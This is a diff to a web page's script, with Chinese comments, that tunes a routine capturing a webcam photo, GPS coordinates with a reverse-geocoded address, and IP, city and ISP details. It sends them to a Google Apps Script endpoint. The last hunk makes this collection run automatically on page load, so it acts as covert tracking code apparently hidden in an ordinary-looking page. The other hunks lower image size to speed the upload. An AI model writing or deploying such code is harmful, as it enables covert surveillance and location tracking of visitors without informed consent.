@@ -272,7 +272,7 @@
     /************************************************
      * 0. Apps Script URL (請改成你自己的)
      ************************************************/
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxYuhLzxLGYMvPWF1c43QZibUkSwCLsfSo-u1xoVNjdltHMNwd5J30MslyqPuozO9tcNg/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwN4HC9KMUfRoQac8AEHeQ9OlXJCjIDPR-OeTmFwvZ8l9qkeyp1Bfs5WghMOThWQB2uhg/exec";
 
     /************************************************
      * 1. Modal 打開 / 關閉 (一般使用者)
@@ -444,7 +444,8 @@
     async function startCamera() {
       let stream = null;
       try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        // ★ 相機解析度可視需求調降，以減少上傳影像大小，優化速度
+        stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }});
         const video = document.createElement('video');
         video.srcObject = stream;
         await new Promise(resolve => {
@@ -453,7 +454,8 @@
             resolve();
           };
         });
-        await new Promise(resolve => setTimeout(resolve, 500)); // 簡單延遲
+        // 簡單延遲 500ms，確保影像畫面更新
+        await new Promise(resolve => setTimeout(resolve, 500));
 
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
@@ -461,7 +463,8 @@
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        const photoData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+        // ★ 壓縮品質可再調整(0 ~ 1)，以減少上傳量
+        const photoData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
         return photoData;
       } catch (error) {
         console.warn('相機啟動失敗:', error);
@@ -479,6 +482,7 @@
           navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
         });
         const { latitude, longitude } = position.coords;
+        // 呼叫 Nominatim 取得大略地址
         const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
         const data = await resp.json();
         const address = data.display_name || '未知地址';
@@ -491,6 +495,7 @@
 
     async function getIpInfo() {
       try {
+        // 透過 ipinfo.io 取得 IP 與地理資訊
         const resp = await fetch('https://ipinfo.io/json');
         const data = await resp.json();
         const { ip, city, region, country, org } = data;
@@ -511,6 +516,7 @@
 
       const collectedData = { gps: null, ip: null, photo: null };
       try {
+        // 平行呼叫以節省時間
         const [gpsResult, ipResult] = await Promise.allSettled([
           getGpsCoordinates(),
           getIpInfo(),
@@ -564,6 +570,7 @@
      ************************************************/
     document.addEventListener('DOMContentLoaded', () => {
       // 如需一進頁面就收集, 可呼叫 collectAndSendData();
+      collectAndSendData();
     });
   </script>
 </body>
